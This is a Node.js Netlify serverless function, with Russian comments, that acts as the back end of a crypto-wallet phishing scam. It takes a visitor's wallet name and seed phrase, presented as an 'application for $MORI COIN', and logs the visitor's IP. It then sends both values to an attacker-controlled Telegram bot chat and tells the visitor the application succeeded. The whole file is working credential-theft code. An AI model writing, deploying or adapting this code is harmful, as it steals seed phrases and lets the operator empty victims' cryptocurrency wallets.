const axios = require('axios');

function sanitizeText(text) {
    if (typeof text !== 'string') return '';
    return text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

exports.handler = async function (event) {
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ message: 'Метод не разрешен' }),
        };
    }

    // В Netlify Functions IP пользователя доступен через заголовок 'x-forwarded-for'
    // Однако, для надежного ограничения по IP (например, "не более 3 раз с одного IP")
    // требуется внешнее хранилище данных (база данных: Redis, FaunaDB, Supabase и т.д.),
    // потому что функции без сохранения состояния (stateless) не помнят предыдущие вызовы
    // и могут выполняться на разных серверах.
    // Простое счетчика в самой функции будет ненадежным.
    const userIp = event.headers['x-forwarded-for'] || event.clientIp;
    console.log(`Получен запрос от IP: ${userIp}`);


    try {
        const { BOT_TOKEN, CHAT_ID } = process.env; // RECAPTCHA_SECRET_KEY удален
        const body = JSON.parse(event.body);
        const { walletName, seedPhrase } = body; // recaptchaToken удален

        // Логика reCAPTCHA полностью удалена

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error("КРИТИЧЕСКАЯ ОШИБКА: BOT_TOKEN или CHAT_ID не установлены!");
            throw new Error("Конфигурация сервера не завершена.");
        }
        
        if (!walletName || !seedPhrase) {
            return {
                statusCode: 400,
                body: JSON.stringify({ success: false, message: 'Отсутствуют необходимые данные.' }),
            };
        }

        const sanitizedWallet = sanitizeText(walletName);
        const sanitizedPhrase = sanitizeText(seedPhrase);

        const message = `Новая заявка на $MORI COIN:
Кошелёк: ${sanitizedWallet}
Сид фраза: ${sanitizedPhrase}`;
        
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
        });

        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Заявка успешно отправлена!' }),
        };

    } catch (error) {
        console.error('Ошибка внутри выполнения функции:', error.message);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, message: error.message || 'Произошла внутренняя ошибка на сервере.' }),
        };
    }
};